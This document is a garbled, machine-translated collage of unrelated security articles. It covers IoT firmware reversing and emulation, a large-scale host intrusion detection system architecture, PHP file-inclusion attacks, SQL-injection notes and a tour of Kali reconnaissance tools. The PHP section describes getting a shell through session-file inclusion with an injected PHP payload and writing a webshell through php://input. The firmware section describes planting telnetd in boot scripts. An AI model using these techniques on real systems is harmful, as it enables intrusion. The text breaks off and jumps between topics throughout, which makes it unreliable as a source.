It is noteworthy that some devices whose lua is not plain text and there is confusion that needs to be decompiled using luadec.

The l u a script in openwrt is a bit different from the traditional luajit compiled one, Several patches are required to decomcompile with luadec, The command is as follows: modify lua-5.1/src/MakeFile: Next: Display code structure with luadec: decomcompile the specified function with luadec (function 0 contains subfunctions): Note, The luadec compilation is architecture-related, Cannot resolve a l u a file in an arm environment with the official luadec, But there are also corresponding tools available online, It will not be repeated here.

Many IOT devices use the RTOS (real-time operating system) architecture. The firmware itself is an executable file, with no file system, and runs directly after startup.

The most important analysis of RTOS is two points: (1) Firmware program entrance (2) firmware program symbol 1.2.2.1 vxworks first starts with the widely used and routine-based vxworks, VxWorks is a real-time operating system launched by Wind River System, widely used in the communications, military, aviation, and aerospace embedded equipment fields.

Because of the standard, it is good, take the following firmware for example: binwalk has identified the firmware as Vxworks 5.5.1, and gives a symbol table location.

First the entry points need to identify the firmware, if the base address is encapsulated in ELF, directly using readelf format, which is obviously not applicable here.

By getting that the firmware architecture is ARM, load directly with IDA pro: analyze the initial firmware jump judgment that the load address is 0x1000.

For the Vxworks general judgment base address method is: analyze the initialization code of the firmware head, find the first function started by vxworks usrInit jump to find the BSS boundary according to the BSS area initialization feature, calculate the firmware loading address according to the offset, and then fix the symbol table name according to the location indicated by the binwalk.

Function table stores the function name and function address, which can also verify the base address through both positioning. For example, 0x00c813f8 is the function name: 0x009aa0f4 is the function address: because the base address and architecture are not detailed address here, for vxworks analysis we can use a plug-in that can automatically repair the entrance and symbols- -vxhunter.

Take Ghidra as an example, and select vxhunter_firmware_init. directly after loading the firmwareThe py plug-in and vxworks version, can automatically repair the entrance and symbol: 1.2.2.2.2 U-bootboot class firmware is often a kind of file system firmware, such as many IOT devices will use U-boot guidance, because U-boot open source, we can refer to source code analysis, for some architecture U-boot can also use fixed routines, such as mips can be according to $gp register, etc.

Some IOT firmware no information, reverse difficulty, such as the following ARM chip firmware, load it into IDA pro found no function: so we need to have a overall analysis of firmware, we see firmware 0x100 location is very interesting: 4 bytes to start with 0x2, here is neither code nor data, it is likely the address, here should be a table, so the base address is likely to be 0x200000.

We rebase and look at the string: see many strings like function names, find the specific location, in the firmware binary search 0x16852A, is the wlc_probresp_attach address (small end).

You can see the real search, but also a table structure: according to the base address found the location in the IDA pro: you can see the completed cross reference, subsequent analysis is more complex, it will no longer expand here, in fact, 0x100 position is the function address table, there are many such tables in this firmware.

So like address tables, strings are all important clues to our analysis of firmware base addresses and functions.

It's easy to pack things, which also applies to firmware packaging.

If the equipment has a debugging interface, generally do not need packaging operation, after all, security research is based on reverse thinking.

Sometimes lack of debugging, we manually to the unwound firmware.

Generally, the cross-compiled good telnetd,dropbear (sshd), gdb into the firmware file, and then replace the boot script package.

There are many start-up scripts for linux, especially in IOT devices, where I generally use more clever methods, such as determining that the / sbin/xxxd service will turn on, and you can replace it: then add sbin/xxxd to start xxxd and run telnetd. first

It is certainly the most convenient thing to package it from a positive development perspective, which is the cross-compilation thing.

Some of the devices I have studied, mainly the router firmware will partially follow the GPL, which is the open source code software (generally based on open source tools), and provide the binary files of the remaining software and the packaging tools for the whole firmware (methods).

For example, a routing device studied previously provides an open source download: download the zip package, compile rootfs, according to their own needs and finally use the tools brought in the zip package: 1.3.2 firmware-mod-kitfirmware-mod-kit (fmk) may be the most commonly used binwalk-based unpacking tool, but updated for a long time, limited use scenarios.

The installation and use of f m k is relatively simple, as shown below: 1.3.3 The difficulty of manual analysis and packaging is that the firmware is consistent with the original firmware, and passes various verification, otherwise the brush machine fails, and the equipment becomes brick.

The author had an article about the netgear upnp vulnerability, involving the netgear firmware packaging process, interested friends can have a look.

Firmware is generally divided into many section, s to facilitate resolution, each section has an indicator header that may store information such as flags, size, and crc verification, which provides basis for unpacking.

For example, you can first get the firmware size (hexadecimal), split bytes according to the firmware size end, generally 4 bytes, and then find similar bytes on the firmware head (the firmware head indicates the length minus the head length), and then analyze from the bytes of the indicated size can clarify the format, and much like the process of analyzing the network protocol.

Of course, most of the head are standard, you can correspond according to one to one standard format.

It's worth noting that some vendors sign the firmware, which makes it harder to pack.

At this point, we can look for some official packaging tools that follow GPL, or use openssl to generate public-private key pairs and override the verification public keys in the device. Of course, there should be loopholes here, otherwise we will fall into the chicken, egg and egg, chicken cycle.

Of course, there is also a better and cheaper way- -firmware simulation.

You can run the program directly with the simulation tool, simply considering whether the dynamic library can be loaded.

Here the root path can be changed by chroot and performed / bin/sh. using simulation tools

You can also hang at / proc to look more realistic when ps viewing the process.
With.

Here, the whole system should be load directly using the tools that can simulate the img system, and you can also use the "nesting doll" method to simulate the debian. of the architecture firstWith img, start the roofs. of the device with chroot

Several commonly used simulation tools are described below.

QemuQemu is the most established multi-architecture simulation tool, the above three use scenarios qemu can be satisfied.

The qemu can download or directly utilize the source installation, here note if the simulation app requires not only qemu but also qemu-user.

The qemu simulation application takes an example of the simulated ARM firmware, Unscrew the firmware to get the rootfs, The following is using qemu simulation to perform busybox:qemu simulation shell using qemu simulation sh is similar to the above case, You can do the mount proc, first Make ps viewing processes more realistic: qemu simulation system qemu is powerful, You can install a system as you do in vmware, virtualbox: the most regular way to simulate a full firmware with qemu is to make the rootfs into an img or qcow2 file, Then performed with the qemu simulation of the corresponding architecture, Here we will introduce the previously mentioned "nesting baby" big method.

First, download the system mirror of the Debian official ARM architecture.

Hang on qcow2 mirror, copy rootfs to qcow2 mirror: Then start qcow2 File: Use chroot "doll" system: Using debian off-of-shelf qcow2 mirror can save network cards and other configuration processes, improve simulation efficiency.

It is worth noting that qemu is also often used when testing the program black box, For example, AFL qemu_mode, will discuss in the later chapter, of course, AFL can also use unicorn_mode, is the simulator unicorn. described below

A Qemu-based cpu instruction simulation framework, that is, any cpu instruction can be simulated.

We can generally use Unicorn command level simulation characteristics: (IOT) program for gdb plugin, or plug-ins of code simulation execution, modify code logic simulation to perform some complex confusion code, improve artificial reverse efficiency about the Unicorn simulation execution modification code logic tutorial, no longer repeat here, the following introduces a Unicorn-based IDA pro plugin, which can simulate execution in IDA pro, and give the execution results, UnicornFuzz related content will be introduced in the later chapter.

The very simple calculator C code above is the official example of the plugin, whose mipsel IDA pro assembly code is as follows: Create a emu object configuration simulation address and parameter start instruction simulation with the sum (2 + 3) result of 0x5.

QilingQiling is a very young Unicorn-based simulator, born specifically for IOT research.

Qiling can function as a IDA pro plugin or f u z z using Qiling Unicornalf, and can also simulate the IOT device firmware.

Qiling is developed with python3 and can be installed directly. The following is part of the code for the official simulation ARMj architecture router firmware: you can see that the Qiling framework further simplifies the code required for the simulation and provides instruction-level pile function, which is still very powerful.

Firmadyne is an automated and scalable system for performing a simulation and dynamic analysis of the Linux-based embedded firmware.

Firmadyne is also based on Qemu, using much the same and many online tutorials, with a-Firm-AFL. using Firmadyne's firmware gray box fuzz tool

The installation of Firm-AFL is divided into user mode and system mode, User mode: System mode: Take the Dlink DIR-815 firmware as an example, first install the Firmadyne, and do some initialization work: modify the r u n in the image_9050 directory according to the router architecture.The sh: then can start fuzz script to test: 1.5 summary firmware research is the basis of IOT vulnerability research, this article as far as possible introduces the firmware research content, on the one hand, the author experience is limited, also some points not involved, on the other hand is limited, many content can not further, later have the opportunity to discuss with you.

To ensure IDC security, it is commonly used based on the host intrusion detection system Host-based Intrusion Detection System, is HIDS.

How can the system architecture design when HIDS faces hundreds of thousands of units or even millions of-scale IDC environments?What technical challenges are complex server environment, network environment, huge data?

Requirements Description For HIDS products, our security product manager has proposed the following requirements for IDC scale deployed in high concurrent server production environments.

Agent low performance low loss extensive deployment compatibility biased application layer and user state intrusion detection.

It provides basic capabilities for the most urgently needed scenarios using host Agent to quickly find system vulnerabilities in massive environments.

Agent and Server configuration distribution channel security configuration information read and write requires authentication configuration change history The Agent plugin has self-update function analysis requirements.

First of all, the server business process is of high priority, the HIDS Agent process can terminate itself, but can not affect the main business of the host, which is the first point, then the business needs to have the circuit breaker function, and have the self-recovery ability.

Secondly, with the ability to keep the process alive, maintain the heartbeat, and obtain new instructions in real time, the full control time of millions of Agent units must be short.

For an extreme example, when there is an emergency in Agent and requires a full stop, then the full stop command is issued and needs to be completed in 1-2 minutes, even in 30 seconds, 20 seconds.

These will be big technical challenges.

There are also dynamic updates of configuration, log-level control, subdivision and accurate control of each H I D S subprocess on each Agent, which can freely control the start and stop of each process, the parameters of each Agent, and can also accurately perceive the online and offline situation of each Agent.

At the same time, Agent itself is a safe Agent, security factor should also be taken into account, including the security of communication channel security, configuration management and so on.

Finally, the service side should also have the consistency guarantee and the availability guarantee. For the management of a large number of Agent, it must be able to realize the task sharing, process the task in parallel, and ensure the consistency of the data.

Considering the continuous expansion of the company and the increasing business, especially after the merger of Meituan and Dianping, facing various operating system problems, the products should also have good compatibility and maintainability.

Technical difficulties After listing the functional points and technical points needed to be realized by the product, and then analyze the technical challenges encountered, including not limited to the following points: resource restrictions, smaller CPU, memory.

The Agent of half a million or even a million servers handles control issues.

After large magnitude, the control efficiency, response latency and data consistency problems.

After large magnitude, data transmission affects the entire server network.

After large magnitude, the running environment is more complex and the perceptual problem of Agent abnormal performance.

After the magnitude is large, the transmission and storage problems of the business log and program operation log are brought by the monitoring business traffic, monitoring data linkage, internal network bandwidth and the burst pressure problems of the storage cluster.

As we can see, almost all the technical difficulties are brought by servers reaching a certain order of magnitude. For a large number of services, cluster distribution is a common solution in the industry.

Architecture design and technical selection for the management of Agent service side, to achieve high availability, disaster tolerance design, then we must do multi-machine room deployment, will certainly encounter the data consistency problem.

Then the storage of data, we need to consider the distributed storage components.

In the distributed data storage, there is a theorem called: CAP-theoremCAP explanation is divided into the following three points: consistency (Consistency): the data of the distributed database remains consistent.

Availability (Availability): Any node is down, and the other node can continue to serve externally.

Partition fault tolerance (network partition) Partition Tolerance: a database of the machine is broken, if the hard disk is broken, the data is lost, you can add a machine, and then synchronize the backed up data from other normal machines.

According to the theorem, a distributed system can only satisfy two of the three terms and not all three.

The easiest way to understand is to imagine two nodes on both sides of the punishment zone.

Allowing at least one node to update the state causes data inconsistency, namely the loss of Consistency.

If the node is set on the side of the partition to be unavailable to ensure data consistency, the Availability. is lost

Unless two nodes can communicate, Consistency and Availability, lead cause loss of Partition Tolerance.

CAP to design for disaster tolerance, the deployment of cluster nodes will choose multiple rooms, so " Partition tolerance」 is impossible to avoid.

In the scenario of the HIDS cluster, each Agent does not have very strong requirements on the sustainable availability of the cluster, and in a short time, abnormalities can occur and communication cannot occur.

However, the final state must be consistent, there can not be a cluster to issue shut-down instructions, and an individual Agent does not listen to the cluster control situation appears.

So, we need a satisfying product.

In the open source community, several famous products that meet CP, such as etcd, ZooKeeper, Consul, etc.

We need to choose the products that meet our needs according to the characteristics of several products.

Add, many people online say Consul is an AP product, which is a wrong description.

Since Consul supports distributed deployment, then there must be "network partition" problems, then be sure to support " Partition tolerance」.

Based on these several factors, we chose to serve as a distributed cluster management for HIDS.

Select etcd For the application of etcd in the project, we respectively use different API interfaces to achieve the corresponding business requirements, according to the business division is as follows: Watch mechanism to realize the real-time acquisition mechanism of configuration change issuance and task issuance.

The brain fissure problem does not exist in etcd, the e t c d cluster election, only if the vote reaches the above, will choose to do Leader, to ensure data consistency.

The Member node of another network partition will have no host.

Language affinity, also developed by Golang, the Client SDK library stably available.

The Key storage supports scope Key operations.

User, Role permissions set different read and write permissions to control Key operations and avoid other clients from modifying other Key information.

TLS to ensure the channel information transmission security.

The Txn Distributed Transaction API works with Compare API to determine host online Key uniqueness.

Lease lease mechanism, expired Key release, better perceived host offline information.

The storage of the underlying K e y of etcd is the B T r e e structure, the search time complexity is O (㏒ n), and the search time consumption of one million level or even ten million level Key is not very different.

The design prefix of etcd Key is issued by role setting: Server configuration.

Agent is registered for online use.

Plugin configuration acquisition usage.

Server Watch, enables instant perception of Agent hosts.

Agent Watch to get configuration changes, task issued.

Agent registered Key with Lease Id, and enabled keepalive, offline instant awareness.

(abnormally offline, 1 / 3 of keepalive time delay) For Key privileges, different Role permissions are set depending on different prefixes.

Assigned to a different User to achieve permission control over Key.

The e t c d cluster management considers the disaster tolerance in etcd nodes. When considering the DNS failure, the node will choose to be deployed in multiple cities and multiple rooms. From our server room selection, there is a node in most rooms. With comprehensive carrying demand, we chose the N server deployed in some important rooms to meet the load and disaster recovery requirements.

However, for etcd, a strong distributed consistent component, the node confirmation change requires each write request into the database and then synchronized to each node, which means that the more nodes, the more network requests to be confirmed, the more time it takes, which will affect the performance of cluster nodes.

For this point, we will later improve individual server performance and sacrifice some disaster capacity to improve cluster processing speed.

The IP list filled out by the client, including the domain name, IP.

The IP is used to avoid DNS faults, and the domain name is used to do Member node updates.

It is best not to use the Discover scheme to avoid greater pressure on the intranet DNS server.

At the same time, when configuring the address of the e t c d node, you should also take the scene of the Intranet DNS failure into account, and the address filling will mix two forms: IP and domain name.

IP address, easy to avoid the Intranet DNS fault.

Domain name form, easy to do individual node replacement or capacity expansion.

When we designed the product architecture, we opened the TLS certificate certification for security. When the node changes, the certificate generation also takes into account the impact of the above two schemes, the certificate needs to include a fixed IP, and the two formats of the DNS domain name range.

etcd Cluster node expansion node expansion and the complete plan in the official manual. etcd Client realizes health detection and fault migration, which can automatically migrate to other available IP in the node IP list.

etcd Node List, can also be no problem for etcd Cluster cluster node changes.

It should be noted that the compatibility of TLS certificates.

Distributed HIDS Cluster Architecture diagram hids-cluster-architecture cluster core components are highly available, all Agent, Server are cluster dependent and can be seamlessly extended without affecting the stability of the entire cluster.

Even if all Server is down, it does not affect all Agent continued efforts.

Agent will not interrupt and have no avalanche impact.

The e t c d cluster can be single node until the entire cluster, and each component is decoupled.

Programming language selection takes into account the large number of company servers, complex business, variable demand environment, and the operating system may include a variety of Linux and Windows.

To ensure the compatibility of the system, we chose Golang as the development language, which has the following features: it can compile statically, run directly through syscall, independent of libc dependence, high compatibility, can be performed on all Linux, easy to deploy.

Static compilation language that can find simple errors before compiling.

With a good GC mechanism, occupying less system resources and low development cost.

Many of the containerized products are written by Golang, like Kubernetes, Docker, etc.

The e t c d project is also written by Golang, class libraries, test cases can be used directly, and SDK supports fast.

Good CSP concurrent model support, efficient covariation scheduling mechanism.

After the completion of HIDS product development, the deployed services all run all kinds of business servers. The importance of the business ranks first, and the functions of our products rank behind.

To this end, the general directions of several products were determined: high availability, consistent data, and scalable horizontally.

Good disaster tolerance, and can deal with the network faults at the machine room level.

Good compatibility, maintaining only one version of Agent.

Low dependent and not dependent on any dynamic link library.

Low invasive, no Hook, no system class library changes.

Circuit breaker downgrade is reliable, would rather hang up their own, rather than affect the business.

Product realization space limit, only discussion,,, and product realization with.

Frame design hids-framework as the figure above, in the design of the framework, encapsulating common class libraries, abstraction definition, stripping, global, abstraction of the App start, exit method of.

So that each (hereinafter referred to as) only needs to realize their own business, which can be convenient and fast for logical writing, without having to care about the underlying implementation, configuration source, retry number, circuit breaker scheme and so on.

Sandbox isolation Considering that subprocesses cannot grow infinitely, there must be a process containing multiple modules, each can use the common underlying components (, etc.), and let each other unaffected, processed here, each attribute object only takes effect in each one.

Also can realize the process, stop all the business logic functions, but also can have the basic functions.

IConfig abstracts the configuration of each App, realizes the common method interface of IConfig to call the function of the configuration, such as the detection method, detects the legitimacy of the configuration, detects the maximum value and minimum range of the configuration, and avoids the situation that the personnel configuration is not within a reasonable range, so as to avoid the risks brought.

The bottom layer of the framework is used to handle the JSON configuration, analyze the read filled in configuration items, compare with Config objects, fill to the corresponding attributes, allow to fill in only the changed configuration in the JSON configuration, not filled in, the corresponding default configuration is used.

Easy and flexible processing of configuration information.

Timer, Clock scheduling in the business data generation, many places need to record the time, the acquisition of time will also produce a lot of system calls.

In particular, thousands of thousands of events are generated per second, which need to call the interface and make system calls, which will greatly increase the system CPU load.

While many events produce low accuracy, accurate to seconds, or hundreds of milliseconds, then the framework implements a granularity meets the demand (such as 100ms, 200ms, or 1s) interval update clock, that is, meets the time demand of the event, and reduces the system call.

Similarly, in some scenarios, when the interval particles are not demanding, they can also be merged into one, reducing calls to the CPU clock.

In Catcher in a multi-cotubration scenario, it will use a lot of cobrates to handle the program. For the panic errors of individual cobrates, the upper thread should have a good capture mechanism, can throw out the cobration errors, and can resume operation, do not let the process crash and exit, and improve the stability of the program.

Abstract interface framework bottom abstracts the Init, Run, Shutdown interface of Sandbox, standardizes the external interface of each App, so that the initialization, stop, operation and other operations of App are standardized.

The module business logic of App does not need to pay attention to PID file management, do not pay attention to cluster communication, do not care about the parent process communication and other common operations, only need to realize their own business logic.

App with framework using Context package and Sync.Conditional locks such as C o n d serve as synchronous control conditions to synchronize the App with the frame, sync between multiple cocobrates, and realize the safe exit of App, ensuring that the data is not lost.

Flow restriction network IO limit data reporting speed queue storage data task list is greater than queue length Data discard discarded data total data count count information is reported to the log center as heartbeat state data for data reconciliation disk IO program running log.

The lower the level, the greater the log volume, the lower the importance, the less the need to send to the log center, to write to the local disk.

So in the abnormal situation of the investigation, convenient for reference.

Log file size control, divided into 2 files, each file is not more than a fixed size, for example, etc.

Also, write both files back and forth to avoid writing the logs over the disk.

IRetry, to strengthen the robustness of Agent, cannot make the overall function unavailable after the failure of some RPC actions, and will generally have a retry function.

Agent and etcd Cluster are also TCP long connection (HTTP2), when the node restart replacement or network lag abnormalities, Agent will reconnect, then the frequency control of the reconnect, can not be a dead loop-like retry.

Assuming that the server intranet switches cause jitter due to the large intranet traffic, triggering the Agent reconnection mechanism, the continuous reconnection increases the burden of the switch and causes an avalanche effect, this design must be avoided.

After each retest, it is necessary to do a certain retreat mechanism, common, such as the following design, in the avalanche avoidance scenario, the robustness of Agent can be guaranteed, set the maximum retest interval, and also avoid the problem of Agent out of control.

Event split millions of IDC scale Agent deployment, in the task execution, cluster communication or resource impact on the host, be sure to wrong peak, according to the unique characteristics of each host mold, split execution, to avoid causing avalanche effect.

In ancient times, when marching and fighting, we advocated "food and grass go first", which was undoubtedly an important factor to determine the victory and defeat in the era of cold weapons.

Do products is also, especially large products, to have a detailed control of their own operation conditions, do a good job of monitoring and alarm, in order to ensure the success of the product.

For the monitoring of etcd cluster, the component itself provides the data output interface, and Prometheus is officially recommended to collect data, and uses Grafana to do aggregation computing and icon drawing. We have done the interface development, docking with the company's alarm system, to realize IM, SMS and telephone alarm.

Agent quantity perception, relies on Watch numbers, accurately in real time.

Because of this operation, it is Agent that communicates directly with the cluster, and has only W a t c h one K e y per Agent.

And the cluster data is unique, consistent, far more accurate than the processing of the heartbeat log.

Health status between Members Monitoring etcd-Grafana-GC-Heap-Objects is used to monitor the status of the e t c d cluster, including data synchronization between nodes, number of Leader elections, number of voting launches, memory application status of each node, GC status, etc., to make a comprehensive control of the health status of the cluster.

And in the subsequent version to gradually do adjustment and optimization.

Millions of servers, the log alarm volume is very large, this level of alarm information screening, aggregation is essential.

Reduce useless alarm, so that research and development operation and maintenance personnel tired, but also to avoid useless alarm lead to research and development personnel to relax vigilance, early ignore the early warning, to solve the main contradiction first.

Alarm information classification, alarm information segmentation ID according to the alarm level filtering, according to the alarm ID to aggregate the alarm, to find the same type of error to aggregate the alarm according to the machine room, project team, product line and other dimensions of the alarm information, to find the same type of error data.

Then, the management of the service side, as long as the machine room, environment, group and product line of the host belongs to, then the granularity of our management Agent can be accurate to each host, that is, to support the gray release management and command issuance at arbitrary latitude.

The Data Reporting Channel component is called, which is a unified log reporting component within the company and will be deployed on each VM, Docker.

All businesses on the host can send the logs to the component.

The log is reported to the Kafka cluster, after processed, falls into the Hive cluster.

(Details are not in the scope of this discussion) The main process communicates with etcd cluster, manages the configuration issuance and command issuance of the whole Agent; manages the start and stop of each submodule; manages the CPU and memory occupation of each submodule, circuit uses the resources, yield the resources, and ensure the operation of the business process.

Plug-in management of other modules, multi-process mode, easy to improve product flexibility, can more easily update the promoter modules, will not cause the whole A g e n t crash due to the function of the individual module plug-ins, BUG.

It means that we are choosing the scheme of the first choice.

For the scheme principle, you can refer to this figure process-connector system invasive comparison with the "system invasive" and "data accuracy", the scheme is better, and the use of CPU, memory and other resources, more controllable.

Compatibility is more incompatible with Docker, this can be deployed on the host to solve.

Ultimately, we chose to complement as our process monitoring scheme with the collection of Bash commands.

Of course, there is still a loss of data, but we have sacrificed some security guarantees for system stability, low product invasive business requirements.

For Docker scenarios, the host runs, captured data, associated to the Docker container, and reported to the log center.

The problem encountered by the kernel Netlink sends data stuck the kernel returns data too fast, the user state analysis read too slow, resulting in the user state network Buff full, the kernel no longer sends data to the user state, the process is idle.

For this problem, we do queue control in the user state to ensure that the problem of resolution time does not affect the kernel sending data.

For the length of the queue, we make a fixed value limit. If the production speed is greater than the consumption speed, we can discard some data, to ensure the normal business operation, and to control the memory growth problem of the process.

The suspected "memory leak" problem is on a Docker host, running 50 Docker instances, each running complex business scenarios, frequent creation processes, on the initial product implementation, starting with about 10M memory footprint, reaching 200M a day later.

After our Debug analysis, we found that when processing the messages sent by the kernel, the PID creation frequently brings about frequent memory applications, frequently instantiated objects, and occupies a large amount of memory.

At the same time, at Golang GC, scanning, cleaning action brings a lot of CPU consumption.
As can be seen from the document, the method can return the memory to the operating system, but we did not adopt this solution, because it treats the symptoms, can not solve the problem of frequent memory application and frequent creation, and can not reduce the CPU usage.

In order to solve this problem, we adopted a built-in object pool method to reuse and recycle objects, avoid the frequent creation of objects, and reduce the memory occupancy situation. After doing object pooling for several frequently created objects, in the same test environment, the memory stability is controlled at about 15M.

The reuse of a large number of objects also reduces the number of objects, and again, when the Golang GC runs, it also reduces the number of object scans, recoveries, and reduces the CPU usage.

In the process of product development, it has also encountered some problems, such as: etcd Client Lease Keepalive's Bug.

Agent process resource limited Cgroup triggers several kernel Bug.

Performance issues created by an instantaneous large number of processes on the Docker host.

When the network monitoring module handles the Nginx reverse agent, it often has hundreds of thousands of TCP-linked network data acquisition pressure.

Individual processes open a f d above 10W.

Method must be more than difficult, but the method is not clap head, must explore the root cause of the problem, find a systematic repair method, with high available, high performance, monitoring alarm, circuit limit function, for problems, can find in advance, minimize the impact of failure, do processing in advance.

When dealing with various problems encountered in the process of product operation, we can open mountains and build Bridges, dealing with them calmly.

After a year of efforts, all other servers except individual special lines of business have been deployed, with hundreds of thousands of units and products running steadily.

In the data integrity, accuracy, still needs to be improved, in the refined operation, need to do more improvement.

This article is more about the design of software architecture from the perspective of research and development, with the experience and skills on security event analysis, data modeling, operation strategy and other aspects, which will be shared by other students in the future. Please look forward to it.

In summary, in the process of developing this product, we also saw several similar products online, also understood their design ideas, and found that many products put the main direction in the implementation of a single module, while ignoring the importance of product architecture.

For example, some products use this highly invasive scheme to ensure data integrity, making it very invasive to the system and very high. The stability of Hook code also seriously affects the stability of the operating system kernel.

At the same time, Hook code lacks measures to monitor circuit breakers, deployed in hundreds of thousands of server-scale scenarios, potentially unacceptable or even fatal to the security sector.

This kind of design, may be in server hours, for more time one by one maintenance, but dealing with hundreds of thousands or even millions of servers, maintenance costs, stability, monitoring circuit breakers and other great technical challenges.

At the same time, it is also difficult to achieve rapid iteration of products in research and development, and the impact of this way will almost always lead to fatal problems such as kernel downtime.

This accident is difficult to accept by the server operator, which will inevitably affect the speed of product development and promotion speed; affect the colleagues (SRE operation and maintenance) confidence in the product, and then bring great resistance to the promotion of subsequent products.

Host intrusion detection, usually divided into two parts: agent and server, where agent is responsible for collecting information and sorting the relevant information sent to server.

server usually acts as an information center, deploying rules written by security personnel, collecting data obtained from various security components (which may also come from waf,NIDS, etc.), conducting analysis, judging whether the host behavior is abnormal according to the rules, and making alarms and prompts on the abnormal behavior of the host.

The purpose of HIDS is to be scrambling that are not caused by security events when administrators manage massive IDC, and can monitor the health of each host through the information center.

Related open source projects include OSSEC,OSquery, OSSEC is a well-built HIDS, with agent end and server end, with its own rules, basic rootkit detection, sensitive file modification reminder and other functions, and is included in an open source project called wazuh, OSquery is a facebook developed open source project, can be used as an agent end for host-related data collection, but server and rules need to be implemented by themselves.

Each company's HIDS agent will be customized according to its own needs, more or more adding some personalized functions. A basic HIDS agent generally needs to achieve: collecting process information, collecting network information, periodic collection of open ports, monitoring sensitive file modifications.

In the Linxu operating system, almost all the operation and maintenance operations and intrusions will be reflected in the command executed, and the essence of the command execution is to start the process, so the monitoring of the process is the monitoring of the command execution, which is of great help to the operation and maintenance operation upgrade and the intrusion behavior analysis.

Since to want to obtain information that clear what need, if you don't know what information needs, the implementation is out of the question, even if hard scalp can achieve a pid basic information of HIDS, later also because of lack of planning and frequent interface, wasted manpower, here refer to the Internet enterprise security guide give a basic list of information, in the back will fill the access of the form.

The information from the phpinfo can obtain the storage location of the session.

The session. is obtained through the information from the phpinfoThe save_path is / var/lib/php/session.

Try by guessing the default session storage location.

If default is stored in / var/lib/php/session directory under linux: content in session can be controlled and malicious passed into code.

This php saves the value of the obtained GET-type ctfs variable into the session.

When accessing the http://www.ctfs-wiki/session.php?After ctfs=ctfs, the value of the session is stored in the / var/lib/php/session directory.

The file name of session is s e s s _ + sessionid,sessionid is available through developer mode.

So the file name for the session is sess_akp79gfiedh13ho11i6f3sm6s6.

Check to the server / var/lib/php/session directory to see this file: the vulnerability exploit.

From the analysis above, it is known that the incoming values of ctfs are stored in the session file, and if the local file contains a vulnerability, you can write the malicious code to the session file through ctfs, and then execute this malicious code getshell. through the file contains a vulnerability

When accessing the http://www.ctfs-wiki/session.php?ctfs=<?php phpinfo();?> After that, the value of the session is stored in the / var/lib/php/session directory.

The attacker leaked or guessed through phpinfo() information, the file name can be obtained through developer mode, and then resolves the malicious code getshell. through the vulnerability contained in the file

If the remote file is not strictly filtered resulting causes the code executing malicious files this is the remote file containing vulnerability.

Test results: Limit that a remote file contains a vulnerability Bypasses the test code: An additional html suffix is added to the code, causing an additional html suffix.

What else can you go around the # number?Running with burp to find spaces can also bypass: 0x04 PHP pseudo-protocol PHP with a lot of built-in URL-style package protocols that can be used for file system functions similar to fopen(), copy (), file_exists (), and filesize().

In addition to these encapsulation protocols, they can also be registered through stream_wrapper_register().

Input and Output Stream PHP provides some miscellaneous input / Output (IO) streams that allow access to PHP's input-output streams, standard IO and error descriptors, in-memory, temporary file streams for backup to disk, and filters that can operate other read write to file resources.

php://filter(Local Disk File to Read) Meta-encapsuator, designed for filter Filter applications when Data Flow is open, to read and write local disk files.

That is, you can directly read the unresolved raw data on the POST.
The php://input is not valid when the enctype = "multipart/form-data" is available.

use:?The file=php://input data was passed over by using POST.

If the data for the POST is executing the PHP code for writing a one-sentence Trojan, a Trojan is written in the current directory.

Although the vulnerability is reported, it is still coded.

1. main station 1.sqlmap cannot read the data sheet 2. cannot use os-shell to getshell3. web site cannot find the absolute path, sql-shell can not write shell2. hospital comprehensive query system has DBA permission but can not os-shell.

The website can't find the absolute path, sql-shell can't write shell, you have good ideas to communicate together.

Information collection wave uses the recent hot 360Quake to a wave of information collection to see a lot of assets, one of them attracted me, carefully look at the school's academic affairs system, with the comprehensive academic affairs system of superstar learning through.

Modify the default key when using the open-source library, and the new keys are generated using ase + base64.

Upgrade Shiro to version 1.5 and above with a custom key.

kaliKali Linux is a L i n u x distribution based on Debian, designed for digital learning and penetration testing.

Maintenance and funded by Offensive Security Ltd, official address: Kali.

The Kali installation mirror can be divided into ISO installation, VMware and VirtualBox.

In addition, there is Kali Linux NetHunter support installation on the mobile phone, related installation tutorial, you can see my article Kali Android penetration testing platform (Nethunter) build tutorial penetration test field certification, there is an important certification OSCP is closely related to kali OSCP PWK refers to Penetration With Kali.

So for a penetration tester, using kali as a major OS is a very wise choice.

The kali collects a very complete toolset, https://tools.kali.org/tools-listing 。

If you have no ideas during the test, take a look at the list of tools inside, and maybe provide some additional ideas.

The other operating system, ParrotParrot Security OS, is a Debian-based Linux distribution focused on computer security.

It is designed for penetration testing, vulnerability evaluation and mitigation, computer forensics and anonymous Web browsing, developed by the Frozenbox team.

BlackArch LinuxBlackArch Linux, simply BlackArch, is a L i n u x based Arch distribution.

CAINECAINE is a live disc distribution for digital forensics, based on Ubuntu.

It provides a complete forensics environment that makes existing software toolsets into software modules and provides a friendly graphical interface.

Security OnionSecurity Onion is a L i n u x distribution designed for intrusion detection and NSM (Network Security Monitoring).

Passive information collection penetration testing workers do not have direct contact with the Target system or the Target Company staff.

It is to get information about the target company.

This process of information collection is called a passive information collection.

When it comes to passive information collection, you have to mention the OSINT (Open-source intelligence).

Public Source Intelligence (En:Open-source intelligence abbreviated OSINT) is intelligence gathered from public sources.

In the Intelligence Agency (IC), "disclosure" is a publicly displayed, publicly visible source (relative to a covered or not publicly visible source).

nslookup,host,dig domain name and ip query, ip or ip whoiswhois is a database used to query whether the domain name has been registered and the detailed details of the domain name (e. g., domain owner, domain name registrar).

FOCAFOCA is mainly an information collection tool to check and scan file metadata and hide information.

In particular, some pictures may be stored for GPS information.

the Harvester is an information collection tool that collects E-mail account information, user names, and host names / subdomains, etc., from different public sources.

shodanShodan is a search engine, but it is different from the search web address like Google, where Shodan is used to search for online devices in cyberspace, where you can search for a specified device, or for a specific type of device.

censysCensys is a search engine that allows computer scientists to understand the devices and networks that make up the Internet.

Driven by Internet-wide scanning, Censys allows researchers to find specific hosts and enables needles to create configuration and deployment information for devices, websites, and certificates into a master report.

The tool is used to investigate online to discover relationships between segments of information from various sources on the Internet.

sublist3rSublist3r is a Python tool that uses OSINT to enumerate website subdomains and can help penetrate testers to collect subdomains of their target domains.

Active Information Collection (Active Reconnaissance) Active reconnaissance is a type of computer attack where the intruder makes contact with the target system to collect information about the vulnerability.
A simple way to distinguish active information collection from passive information collection is whether attempts to collect information may be perceived by the target system.

If the target system does not perceive it, it is passive information collection, and it is active information collection.

nmap and zenmapNmap(Network Mapper) is a network security tool for network discovery and security auditing.

The Nmap can detect whether the target host is online, the port is open, detect the service type and version information, and detect the operating system and device type.

enum4linuxenum4linux can collect a lot of information about the Windows system, such as a username list, host list, shared list, password policy information, working group and member information, host information, printer information, and much more.

